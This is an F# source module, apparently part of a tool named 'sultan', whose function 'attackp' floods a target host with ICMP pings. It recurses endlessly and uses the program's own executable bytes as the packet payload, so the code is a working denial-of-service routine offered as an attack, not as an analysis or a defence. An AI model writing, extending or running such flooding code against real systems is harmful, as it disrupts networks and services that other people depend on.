namespace sultan

open sultan
open sultan.printxlib

open System
open System.IO
open System.Net
open System.Text
open System.Net.NetworkInformation

module pinglib =
    let nil : string = string (char 0x00)
    let data : string = File.ReadAllText((System.Reflection.Assembly.GetEntryAssembly().Location))

    let rec attackp (nth : int) (host : string)  =
        let pingSender : Ping = new Ping()
        let options : PingOptions = new PingOptions()

        let buffer : byte array = Encoding.ASCII.GetBytes(data)

        let timeout : int = 120
        pingSender.SendAsync(host, 10000000, buffer, options) |> ignore
        verbose ("pinged -> " + host + " " + (nth.ToString()) + " times")
        attackp (nth + 1) host
